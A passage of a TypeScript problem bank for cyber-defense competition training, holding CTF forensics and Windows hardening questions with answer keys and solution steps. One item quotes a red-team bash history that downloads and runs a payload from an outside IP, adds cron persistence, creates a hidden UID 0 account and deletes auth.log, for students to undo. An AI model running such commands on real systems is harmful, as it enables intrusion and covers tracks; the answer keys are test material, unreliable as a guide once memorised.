			"Trying to 'fix' the file as a JPEG — it's not a JPEG, it's a ZIP archive with a wrong extension",
			"Trusting file extensions instead of using the 'file' command — this is the #1 CTF forensics lesson",
			"Not checking for hidden files after extraction — CTF flags are often in dotfiles like .flag or .hidden",
			"Forgetting to recursively search for flags — the flag might be nested several directories deep",
			"Not considering that there could be multiple layers — a ZIP inside a ZIP inside a renamed file is common in CTFs",
		],
		prerequisites: ["file-command", "magic-bytes", "zip-archives", "command-line-basics"],
		difficulty: "foundational",
	},
	{
		id: "ncae-cf-2",
		topic: "ncae-ctf-forensics",
		subtopic: "attack-reconstruction",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"After the red team compromised a server, you need to figure out what they did. The bash history shows:\n\nwget http://10.0.99.5/payload.sh -O /tmp/.hidden.sh\nchmod +x /tmp/.hidden.sh\n/tmp/.hidden.sh\necho '* * * * * root /tmp/.hidden.sh' >> /etc/crontab\nuseradd -o -u 0 -g 0 -M -d /root -s /bin/bash maint\necho 'maint:password123' | chpasswd\nrm -f /var/log/auth.log\niptables -A INPUT -s 10.0.99.5 -j ACCEPT\n\nList everything the attacker did, explain the purpose of each command, and provide the exact commands to undo each action.",
		correctAnswer:
			"(1) Downloaded a payload from their server — undo: rm /tmp/.hidden.sh. (2) Made it executable and ran it — undo: check what it did (cat /tmp/.hidden.sh), kill any spawned processes. (3) Added a cron job to run the payload every minute — undo: remove the line from /etc/crontab. (4) Created a hidden root account 'maint' with UID 0 — undo: userdel -r maint. (5) Set a weak password on it — already handled by deleting the account. (6) Deleted auth.log to cover tracks — undo: touch /var/log/auth.log && systemctl restart rsyslog. (7) Allowed all traffic from their IP through the firewall — undo: iptables -D INPUT -s 10.0.99.5 -j ACCEPT.",
		solutionSteps: [
			"Command 1 — wget: downloaded a malicious script to a hidden file (/tmp/.hidden.sh) — undo: rm /tmp/.hidden.sh",
			"Command 2 — chmod +x: made the payload executable — moot after deletion, but check what it spawned",
			"Command 3 — executed the payload: examine the script first (cat /tmp/.hidden.sh) before deleting to understand what it does",
			"Check for processes spawned by the payload: ps aux | grep -v grep | grep 'hidden\\|payload\\|10.0.99.5'",
			"Command 4 — cron persistence: runs the payload every minute — undo: edit /etc/crontab and remove the line",
			"Verify: crontab -l and check /etc/cron.d/ for additional persistence",
			"Command 5 — useradd -o -u 0: created user 'maint' with UID 0 (root), -o allows duplicate UID — undo: userdel -rf maint",
			"Command 6 — chpasswd: set a known weak password — already handled by deleting the account",
			"Command 7 — rm auth.log: destroyed evidence — undo: touch /var/log/auth.log && chmod 640 /var/log/auth.log && systemctl restart rsyslog",
			"Command 8 — iptables ACCEPT: created a firewall rule to allow all traffic from their IP — undo: iptables -D INPUT -s 10.0.99.5 -j ACCEPT",
			"After cleanup: verify with awk -F: '$3 == 0' /etc/passwd (only root), crontab -l (no malicious entries), iptables -L -n (no rogue rules)",
		],
		commonMisconceptions: [
			"Deleting the payload without reading it first — you need to know what it does to find all its effects",
			"Forgetting the cron job — even if you kill the process and delete the file, the cron will re-download and re-execute it",
			"Not recognizing -o -u 0 as a UID 0 (root) account — the -o flag allows duplicate UIDs, which is how hidden root accounts work",
			"Just recreating auth.log without restarting rsyslog — the logging daemon needs to be told about the new file",
			"Using iptables -F to remove the ACCEPT rule — this flushes ALL rules including your own defense rules; use -D to delete the specific rule",
		],
		prerequisites: ["bash-commands", "cron-fundamentals", "user-management", "iptables"],
		difficulty: "stretch",
	},

	// ── Windows System Hardening ──
	{
		id: "ncae-wh-1",
		topic: "ncae-windows-hardening",
		subtopic: "firewall-services",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"You're hardening a Windows Server running IIS. Running 'netstat -an' shows these listening ports:\n\nTCP 0.0.0.0:80   LISTENING  (IIS)\nTCP 0.0.0.0:135  LISTENING  (RPC)\nTCP 0.0.0.0:445  LISTENING  (SMB)\nTCP 0.0.0.0:3389 LISTENING  (RDP)\nTCP 0.0.0.0:5985 LISTENING  (WinRM)\n\nOnly HTTP (port 80) is a scored service. Which services should you restrict or disable, and what commands would you use?",
		correctAnswer:
			"Keep port 80 (IIS) open. Restrict or disable: (1) RDP (3389) — restrict to team subnet only: netsh advfirewall firewall add rule name='RDP-Team' dir=in action=allow protocol=tcp localport=3389 remoteip=10.0.1.0/24 & block others. (2) SMB (445) — disable if not needed: Set-Service -Name LanmanServer -StartupType Disabled; Stop-Service LanmanServer. (3) WinRM (5985) — same as RDP, restrict to team subnet. (4) RPC (135) — difficult to disable (many Windows services depend on it), restrict via firewall instead.",
		solutionSteps: [
			"Port 80 (IIS) — this is scored, leave it open and accessible from everywhere",
			"Port 3389 (RDP) — you need this for remote access, but restrict to your team's subnet only",
			"Firewall command: netsh advfirewall firewall add rule name=\"Block-RDP\" dir=in action=block protocol=tcp localport=3389",
			"Then allow from team: netsh advfirewall firewall add rule name=\"Allow-RDP-Team\" dir=in action=allow protocol=tcp localport=3389 remoteip=10.0.1.0/24",
			"Port 445 (SMB) — major attack vector (EternalBlue, etc.); disable if file sharing isn't needed",
			"PowerShell: Set-Service -Name LanmanServer -StartupType Disabled; Stop-Service -Name LanmanServer -Force",
			"Port 5985 (WinRM) — remote management; restrict to team subnet like RDP, or disable: Stop-Service WinRM; Set-Service WinRM -StartupType Disabled",
			"Port 135 (RPC) — many Windows services depend on this; don't disable it, but restrict via firewall rules",
			"Verify: netstat -an | findstr LISTENING to confirm only expected ports are open",
			"Make sure Windows Firewall is enabled: Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True",
		],
		commonMisconceptions: [
			"Disabling RDP entirely — you'll lock yourself out of the server if you don't have physical/console access",
			"Trying to disable RPC completely — too many Windows services depend on it; restrict via firewall instead",
			"Leaving SMB open because 'it's a Windows thing' — SMB is one of the most exploited services (EternalBlue/WannaCry)",
			"Not enabling the Windows Firewall first — rules don't matter if the firewall profile is disabled",
			"Blocking port 80 by accident — always verify your rules don't block the scored service",
		],
		prerequisites: ["windows-basics", "netstat", "windows-firewall", "windows-services"],
		difficulty: "foundational",
	},
	{
		id: "ncae-wh-2",
		topic: "ncae-windows-hardening",
		subtopic: "account-policy",
		educationLevel: "competition",
		gradeLevel: 0,
		question:
			"Your Windows competition server has these security issues:\n1. The local Administrator password is 'Password1'\n2. Guest account is enabled\n3. No account lockout policy\n4. Password policy allows minimum 1-character passwords\n5. Windows Firewall is turned off\n\nUsing PowerShell commands, fix all five issues. Be specific.",
		correctAnswer:
			"(1) net user Administrator N3wStr0ngP@ss2024! (2) net user Guest /active:no (3) net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30 (4) net accounts /minpwlen:12 (5) Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True. These can all be run from an elevated PowerShell prompt.",
		solutionSteps: [
			"Issue 1 — weak admin password: net user Administrator 'N3wStr0ngP@ss2024!' (use a complex password with 12+ chars)",
			"Or in PowerShell: Set-LocalUser -Name Administrator -Password (ConvertTo-SecureString 'N3wStr0ngP@ss2024!' -AsPlainText -Force)",
			"Issue 2 — Guest account enabled: net user Guest /active:no",
			"Or: Disable-LocalUser -Name Guest",
			"Issue 3 — no lockout policy: net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30",
			"This locks accounts for 30 minutes after 5 failed attempts within a 30-minute window",
			"Issue 4 — weak password policy: net accounts /minpwlen:12",
			"Can also enforce complexity: run secpol.msc → Account Policies → Password Policy → Password must meet complexity requirements → Enabled",
			"Issue 5 — firewall off: Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True",
			"Verify all changes: net accounts (shows password and lockout policy), Get-NetFirewallProfile (shows firewall status)",
		],
		commonMisconceptions: [
			"Setting a 'strong' password that's still guessable (like 'Company2024!') — red teams have wordlists for these",
			"Disabling the Guest account but forgetting other default accounts — check for DefaultAccount and other built-in accounts",
			"Setting lockout threshold too low (1-2 attempts) — this makes it easy for the red team to lock out YOUR team's accounts via a denial-of-service",
			"Enabling the firewall without checking existing rules — the firewall might have overly permissive rules that need cleanup",
			"Only fixing these five issues — there are many more hardening steps (disable unnecessary services, audit policies, remove stored credentials, etc.)",
		],
		prerequisites: ["windows-powershell", "net-commands", "security-policy-basics"],
		difficulty: "on-grade",
	},
];

export function getProblemsForTopic(topic: Topic): Problem[] {
	return PROBLEM_BANK.filter((p) => p.topic === topic);
}

export function getProblemById(id: string): Problem | undefined {
	return PROBLEM_BANK.find((p) => p.id === id);
}

export function getNextProblem(
	topic: Topic,
	completedIds: string[],
): Problem | undefined {
	const topicProblems = getProblemsForTopic(topic);
	const difficultyOrder = ["foundational", "on-grade", "stretch"] as const;

	for (const difficulty of difficultyOrder) {
		const next = topicProblems.find(
			(p) => p.difficulty === difficulty && !completedIds.includes(p.id),
		);
		if (next) return next;
	}
	return undefined;
}

export function getAllTopics(level?: EducationLevel): { id: Topic; label: string; count: number }[] {
	const topics = level ? getTopicsForLevel(level) : [...TOPICS];
	return topics.map((t) => ({
		id: t,
		label: TOPIC_LABELS[t],
		count: getProblemsForTopic(t).length,
	}));
}
